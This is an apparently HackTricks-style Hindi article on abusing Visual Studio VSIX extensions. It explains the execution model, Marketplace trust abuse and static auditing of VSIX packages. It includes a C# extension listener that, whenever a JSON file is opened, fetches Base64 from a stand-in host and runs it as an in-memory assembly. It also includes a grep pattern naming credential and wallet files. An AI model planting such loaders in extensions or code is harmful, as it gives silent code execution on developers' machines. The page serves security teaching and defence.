# Visual Studio VSIX Extension का दुरुपयोग

{{#include ../banners/hacktricks-training.md}}

Visual Studio extension, editor के सामान्य कामकाज को लॉग-इन उपयोगकर्ता की पहचान के तहत code execution में बदल सकता है। एक दुर्भावनापूर्ण VSIX, किसी विश्वसनीय publisher की नकल करने वाला publisher, या compromised extension update सामान्य installation channels के ज़रिए उस उपयोगकर्ता तक पहुँच सकता है। Administrator prompt के साथ installation, उपयोगकर्ता की सहमति से होने वाला installation path है—यह अपने-आप privilege escalation नहीं है।<sup>[[1]](#references)</sup>

## Execution model

Classic VSSDK extensions आमतौर पर `devenv.exe` के अंदर execute होते हैं। नया `VisualStudio.Extensibility` model, modern .NET extensions को मुख्य रूप से out of process चलाता है: Visual Studio, calls को एक dedicated `Microsoft.ServiceHub.Host.Extensibility` process तक पहुँचाता है। इससे IDE की stability अलग रहती है, लेकिन extension को उपयोगकर्ता की Windows permissions से **sandbox** नहीं किया जाता। Executable का सटीक नाम architecture suffix के साथ हो सकता है, जैसे `ServiceHub.Host.Extensibility.arm64.exe`।<sup>[[1]](#references)[[2]](#references)</sup>

### Editor की सामान्य गतिविधि पर trigger करना

सिर्फ़ कोई स्पष्ट menu command देने के बजाय, extension `ITextViewOpenClosedListener` implement कर सकता है। इसका `TextViewOpenedAsync` callback मेल खाने वाले documents के लिए invoke होता है, जबकि `TextViewExtensionConfiguration.AppliesTo` activation को JSON जैसे किसी आम type तक सीमित कर सकता है। कोई वास्तविक formatter या linter अपना घोषित काम करते हुए भी, फ़ाइल खोलने पर side effect के रूप में दूसरी कार्रवाई चला सकता है।<sup>[[1]](#references)[[3]](#references)</sup>

नीचे दिया गया संक्षिप्त pattern execution के अहम बिंदु दिखाता है; स्पष्टता के लिए इसमें वैध formatter और error handling शामिल नहीं हैं।<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>इवेंट-ट्रिगर किया गया in-memory managed assembly loader</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

यह chain Base64 text डाउनलोड करती है, उसे assembly bytes में decode करती है, `MemoryStream` से collectible `AssemblyLoadContext` के ज़रिए load करती है, reflected `EntryPoint` को बिना parameters या `string[]` के साथ invoke करती है, asynchronous entry points का इंतज़ार करती है और context को unload करती है। दूसरा stage disk पर नहीं लिखा जाता, हालांकि VSIX और primary extension DLL disk artefacts बने रहते हैं। Base64 authenticity या confidentiality नहीं देता; HTTP का उपयोग करने से on-path attacker response को बदल भी सकता है।<sup>[[1]](#references)</sup>

Operational variations में staging विफल होने पर advertised feature को जारी रखने के लिए सभी exceptions को suppress करना, या edits के बाद trigger करने के लिए `ITextViewChangedListener` का उपयोग करना शामिल है। Code extension host में execute होता है और उस user के लिए उपलब्ध managed APIs, P/Invoke, files, credentials और child processes का उपयोग कर सकता है।<sup>[[1]](#references)</sup>

Native plugin autoloading पर आधारित editor-specific execution surface के लिए देखें:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Marketplace और delivery trust का दुरुपयोग

VSIX सीधे साझा की गई/phished file के रूप में, web Marketplace से, या Visual Studio के embedded Marketplace browser के ज़रिए आ सकती है। Publisher registration में मुख्य रूप से uniqueness और reserved-word list लागू होने के कारण देखने में suggestive publisher identities की गुंजाइश रह सकती है; पहले से trusted publisher या extension को compromise करना और भी प्रभावी है, क्योंकि इससे उसके installed user base का लाभ मिलता है। Marketplace installation में Visual Studio Installer का उपयोग होता है और डाउनलोड की गई VSIX को कुछ समय के लिए `%LOCALAPPDATA%\Temp` में रखा जाता है; `payload.vsix` का वैध उपयोग भी होता है, इसलिए केवल filename कोई indicator नहीं है।<sup>[[1]](#references)</sup>

MDSec को ऐसा Visual Studio URL protocol नहीं मिला जो सीधे extension install करता हो। Operator को फिर भी user से VSIX install/trust करवाना होगा, या किसी मौजूदा extension के distribution path को compromise करना होगा। `AllUsers` package Visual Studio installation folder में install होता है और elevation माँग सकता है, लेकिन यह सामान्य, सहमति-आधारित installer behavior है—administrator या SYSTEM तक पहुँचने का कोई automatic रास्ता नहीं।<sup>[[1]](#references)[[4]](#references)</sup>

### बड़े पैमाने पर static auditing

VSIX packages आमतौर पर ZIP containers होते हैं, इसलिए सुरक्षित marketplace-review pipeline packages की सूची बना सकती है, **extension code load किए बिना** उन्हें unpack कर सकती है, manifests parse कर सकती है, executable surfaces की पहचान कर सकती है और managed assemblies को `ilspycmd` से decompile कर सकती है। सामान्य bundled dependencies को हटाने के बाद extension की अपनी assemblies को प्राथमिकता दें, फिर credential-store strings को behavioral clusters से correlate करें—जैसे file-read के साथ network-send, encode के साथ send, download के साथ execution, credential-manager के साथ network access, या screenshot के साथ send।<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

साथ ही native DLLs, MSBuild targets, scripts, T4 templates और installer payloads की भी सूची बनाएँ; यह न मानें कि हर execution surface managed code ही है। संदिग्ध व्यवहार की तुलना manifest में बताए गए उद्देश्य से करें; telemetry और वैध updaters, exfiltration या staging जैसे दिख सकते हैं। केवल static review करने से packed, obfuscated, dynamically resolved और dormant code छूट सकता है; और केवल नवीनतम version की समीक्षा करने से दुर्भावनापूर्ण पुराने releases छूट सकते हैं।<sup>[[1]](#references)</sup>

एक अलग project-load attack, VSIX install किए बिना, दुर्भावनापूर्ण [MSBuild `GetFrameworkPaths` target](visual-studio-project-msbuild-execution.md) execute कर सकता है।<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Visual Studio extensions पर फिर से नज़र](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - VisualStudio.Extensibility के बारे में](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - VSIX package की संरचना](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - ilspycmd .NET tool](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Blinder Tunnel अभियान ने इराकी infrastructure को निशाना बनाया](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
